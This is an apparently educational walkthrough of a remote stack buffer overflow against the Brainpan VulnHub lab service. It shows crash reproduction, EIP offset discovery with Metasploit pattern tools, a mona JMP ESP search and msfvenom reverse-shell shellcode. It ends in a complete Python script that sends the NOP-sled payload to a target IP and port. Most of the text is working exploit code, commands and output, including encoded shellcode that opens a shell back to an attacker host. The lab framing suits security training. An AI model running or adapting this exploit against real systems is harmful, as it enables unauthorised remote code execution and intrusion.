# Remote Buffer Overflow
A remote buffer overflow is a way of passing input into a remote handler than does not check the size before allocating that input to a symbol, or variable. Below we will do a simple excerise that is part of the [Brainpan VulnHUB VM]() exercise.
## Install Windows VM
### Download the Windows 7 VM
You can download the Windows 7 (64bit) VM [from Microsoft directly](https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/).
### Install Immunity Debugger
You can download the Immunity Debugger application that we will use to analyze what the application is doing [from here.](https://www.immunityinc.com/products/debugger/)
### Disable the Windows VM FW
For ICMP and HTTP requests to work from our attacker machine to our Windows 7 box, we will need to first diable the firewall on the Windows VM. You will recognize the issue when you try to ping the Attacker machine from the Windows VM, then vice versa. The latter will not work out-of-the-box.
## Running Brainpan Locally
Get the `brainpan.exe` file from the brainpan VM via HTTP. You will have to enumerate the file. Then styart up the brainpan service in the Windows VM. Now, we have a vulnerable platform to attck from our attacker system. We will use this environment to design our working exploit, then run it against the actual Linux Brainpan server.
## Crash Brainpan
Next, we need to crash Brainpan.exe remotely. We can do this by using Python to create a long string of "A" bytes, which are 0x41 in hexadecimal. Then, pass the string of "A" bytes as the "PASSWORD" to Brainpan.exe via a Netcat connection.
```
root@attacker:~# python -c 'print "A" * 1024;'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ...
root@attacker:~# nc (TARGET IP ADDRESS) 9999
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          >> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ...
```
After sending this many "A"s to the Brainpan.exe service, it will crash and in Immunity Debugger, we will see that the EIP register is overwritten with `41414141` which is four 0x41 bytes, or "A" in ASCII. 
## Control EIP
Next, we need write control over the EIP pointer CPU register. We already know we can do this by overwriting the buffer with "A"s until EIP says `41414141` as shown in the previous step. Now, we need to know exactly where it is. To do so, we will use a Metasploit module, `create_pattern.rb` ruby script.
```
root@attacker-machine:~# /infosec/exploitation/metasploit-framework/tools/exploit/pattern_create.rb -l 1024
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0B

```
Now, we pass this as input from our Attacker machine into the remote Brainpan.exe service on our Windows machine and view the EIP regitser data after Brainpan.exe crashes. 
```
nc (TARGET IP ADDRESS) 9999
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          >> Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae ...
```
In my case the EIP was overwritten with `35724134`. Now, we need to find that offset using the `pattern_offset.rb` ruby script in the Metasploit Framework as shown,
```
root@attacker-machine:~# /infosec/exploitation/metasploit-framework/tools/exploit/pattern_offset.rb -q 35724134
[*] Exact match at offset 524
```
Great news, we can now overwrite and control EIP by sending creating a new overflow string in Python as follows,
```
root@attacker-machine:~# python -c 'print "A" * 524 + "ABCD" + "A" * (1024 - 524 - 4);'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ... 
root@attacker-machine:~# echo -n AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ... | wc -c
1024
```
As you can see, this embedded a new substring at offset of 524 bytes of "ABCD" and then re-filled the rest of the bytes to equal 1024 total again. Now, if we send this to the Brainpan.exe service on our Windows VM from our Attacker VM, the EIP should say "ABCD" backwards in hexadecimal format as so, `44434241`

## Find the ESP
Next, we need to find out where in the application we have a `JMP ESP` Assemblyt instruction. But before we search Brainpan.exe for that instruction, we need the "byte code" format of the instruction. This is the hexadecimal representation of the Assembly instruction that the CPU reads. We can do this with the `nasm_shell` utility in Metasploit Framework.
```
root@attacker:~# /infosec/exploitation/metasploit-framework/tools/exploit/nasm_shell.rb
nasm> jmp esp
00000000  FFE4      jmp esp
```
Great, this is `\xff\xe4` as shown as the second column of the listing output from `nmap_shell.rb` above. Go back to the Windows VM and restart Brainpan.exe in Immunity Debugger and in the bottom left input box, use the following command to find the address of `JMP ESP` in the binary,
```
!mona find -s "\xff\xe4" -m brainpan.exe
```
This will give you the output in a new window. For me, this new address was `0x311712f3`.
## Create Shell Code
Next up, we create shell code which will spawn a reverse shell from our Windows VM to out Attacker machine. We will do so with `msfvenom` from the Metasploit Framework as shown below. I also have a cheat sheet on how to create various shell codes and payloads using this application [here.](https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Payloads/msfvenom-cheat-sheet.md)
```
root@attacker-machine:~# /infosec/exploitation/metasploit-framework/msfvenom -p windows/shell_reverse_tcp LPORT=666 LHOST=(ATTACKER IP ADDRESS) -e x86/shikata_ga_nai -b "\x00" -f py
buf = ""
buf += "\xda\x7c\x ...
```
Copy the entire listing starting at the `buf = ""` line down.
```
buf =  ""
buf += "\xdb\xce\xb8\x6e\x4f\x5d\x95\xd9\x74\x24\xf4\x5b\x29"
buf += "\xc9\xb1\x52\x31\x43\x17\x83\xc3\x04\x03\x2d\x5c\xbf"
buf += "\x60\x4d\x8a\xbd\x8b\xad\x4b\xa2\x02\x48\x7a\xe2\x71"
buf += "\x19\x2d\xd2\xf2\x4f\xc2\x99\x57\x7b\x51\xef\x7f\x8c"
buf += "\xd2\x5a\xa6\xa3\xe3\xf7\x9a\xa2\x67\x0a\xcf\x04\x59"
buf += "\xc5\x02\x45\x9e\x38\xee\x17\x77\x36\x5d\x87\xfc\x02"
buf += "\x5e\x2c\x4e\x82\xe6\xd1\x07\xa5\xc7\x44\x13\xfc\xc7"
buf += "\x67\xf0\x74\x4e\x7f\x15\xb0\x18\xf4\xed\x4e\x9b\xdc"
buf += "\x3f\xae\x30\x21\xf0\x5d\x48\x66\x37\xbe\x3f\x9e\x4b"
buf += "\x43\x38\x65\x31\x9f\xcd\x7d\x91\x54\x75\x59\x23\xb8"
buf += "\xe0\x2a\x2f\x75\x66\x74\x2c\x88\xab\x0f\x48\x01\x4a"
buf += "\xdf\xd8\x51\x69\xfb\x81\x02\x10\x5a\x6c\xe4\x2d\xbc"
buf += "\xcf\x59\x88\xb7\xe2\x8e\xa1\x9a\x6a\x62\x88\x24\x6b"
buf += "\xec\x9b\x57\x59\xb3\x37\xff\xd1\x3c\x9e\xf8\x16\x17"
buf += "\x66\x96\xe8\x98\x97\xbf\x2e\xcc\xc7\xd7\x87\x6d\x8c"
buf += "\x27\x27\xb8\x03\x77\x87\x13\xe4\x27\x67\xc4\x8c\x2d"
buf += "\x68\x3b\xac\x4e\xa2\x54\x47\xb5\x25\x9b\x30\x5c\x0f"
buf += "\x73\x43\x9e\x72\x1e\xca\x78\x18\x0e\x9b\xd3\xb5\xb7"
buf += "\x86\xaf\x24\x37\x1d\xca\x67\xb3\x92\x2b\x29\x34\xde"
buf += "\x3f\xde\xb4\x95\x1d\x49\xca\x03\x09\x15\x59\xc8\xc9"
buf += "\x50\x42\x47\x9e\x35\xb4\x9e\x4a\xa8\xef\x08\x68\x31"
buf += "\x69\x72\x28\xee\x4a\x7d\xb1\x63\xf6\x59\xa1\xbd\xf7"
buf += "\xe5\x95\x11\xae\xb3\x43\xd4\x18\x72\x3d\x8e\xf7\xdc"
buf += "\xa9\x57\x34\xdf\xaf\x57\x11\xa9\x4f\xe9\xcc\xec\x70"
buf += "\xc6\x98\xf8\x09\x3a\x39\x06\xc0\xfe\x49\x4d\x48\x56"
buf += "\xc2\x08\x19\xea\x8f\xaa\xf4\x29\xb6\x28\xfc\xd1\x4d"
buf += "\x30\x75\xd7\x0a\xf6\x66\xa5\x03\x93\x88\x1a\x23\xb6"
```
## Constructing the Payload
Next, we need to construct the entire payload with teh following simple Python script. This will create a NOP sled that will slide our code down NOP Assembly instructions until it hits our shell code. The entire string that this outputs is the payload.
```
# the JMP ESP address: 0x311712f3 = "\xf3\x12\x17\x31" - it's backwards because of little-endian.
python -c 'print "A" * 524 + "\xf3\x12\x17\x31" + "\x90" * (1024 - 524 - 4) + buf;
```
Now, if we run this, it will print garbage to our screens, so we must employ Python to make the connection to the Windows VM Brainpan.exe service and send th payload for us. We do so with the followin easy Python script.
```
import sys
import socket as so

buf =  ""
buf += "\xdb\xce\xb8\x6e\x4f\x5d\x95\xd9\x74\x24\xf4\x5b\x29"
buf += "\xc9\xb1\x52\x31\x43\x17\x83\xc3\x04\x03\x2d\x5c\xbf"
buf += "\x60\x4d\x8a\xbd\x8b\xad\x4b\xa2\x02\x48\x7a\xe2\x71"
buf += "\x19\x2d\xd2\xf2\x4f\xc2\x99\x57\x7b\x51\xef\x7f\x8c"
buf += "\xd2\x5a\xa6\xa3\xe3\xf7\x9a\xa2\x67\x0a\xcf\x04\x59"
buf += "\xc5\x02\x45\x9e\x38\xee\x17\x77\x36\x5d\x87\xfc\x02"
buf += "\x5e\x2c\x4e\x82\xe6\xd1\x07\xa5\xc7\x44\x13\xfc\xc7"
buf += "\x67\xf0\x74\x4e\x7f\x15\xb0\x18\xf4\xed\x4e\x9b\xdc"
buf += "\x3f\xae\x30\x21\xf0\x5d\x48\x66\x37\xbe\x3f\x9e\x4b"
buf += "\x43\x38\x65\x31\x9f\xcd\x7d\x91\x54\x75\x59\x23\xb8"
buf += "\xe0\x2a\x2f\x75\x66\x74\x2c\x88\xab\x0f\x48\x01\x4a"
buf += "\xdf\xd8\x51\x69\xfb\x81\x02\x10\x5a\x6c\xe4\x2d\xbc"
buf += "\xcf\x59\x88\xb7\xe2\x8e\xa1\x9a\x6a\x62\x88\x24\x6b"
buf += "\xec\x9b\x57\x59\xb3\x37\xff\xd1\x3c\x9e\xf8\x16\x17"
buf += "\x66\x96\xe8\x98\x97\xbf\x2e\xcc\xc7\xd7\x87\x6d\x8c"
buf += "\x27\x27\xb8\x03\x77\x87\x13\xe4\x27\x67\xc4\x8c\x2d"
buf += "\x68\x3b\xac\x4e\xa2\x54\x47\xb5\x25\x9b\x30\x5c\x0f"
buf += "\x73\x43\x9e\x72\x1e\xca\x78\x18\x0e\x9b\xd3\xb5\xb7"
buf += "\x86\xaf\x24\x37\x1d\xca\x67\xb3\x92\x2b\x29\x34\xde"
buf += "\x3f\xde\xb4\x95\x1d\x49\xca\x03\x09\x15\x59\xc8\xc9"
buf += "\x50\x42\x47\x9e\x35\xb4\x9e\x4a\xa8\xef\x08\x68\x31"
buf += "\x69\x72\x28\xee\x4a\x7d\xb1\x63\xf6\x59\xa1\xbd\xf7"
buf += "\xe5\x95\x11\xae\xb3\x43\xd4\x18\x72\x3d\x8e\xf7\xdc"
buf += "\xa9\x57\x34\xdf\xaf\x57\x11\xa9\x4f\xe9\xcc\xec\x70"
buf += "\xc6\x98\xf8\x09\x3a\x39\x06\xc0\xfe\x49\x4d\x48\x56"
buf += "\xc2\x08\x19\xea\x8f\xaa\xf4\x29\xb6\x28\xfc\xd1\x4d"
buf += "\x30\x75\xd7\x0a\xf6\x66\xa5\x03\x93\x88\x1a\x23\xb6"

payload = "A" * 524 + "\xf3\x12\x17\x31" + "\x90" * (1024 - 524 -4) + buf

server = "192.168.233.189"
port = 9999

s = so.socket(so.AF_INET, so.SOCK_STREAM)
print "[*] Sending payload to target ... \n"
# Send the payload already:
s.connect((server,port))
s.send(payload + '\r\n')
print "[*] Payload sent.\n"
```
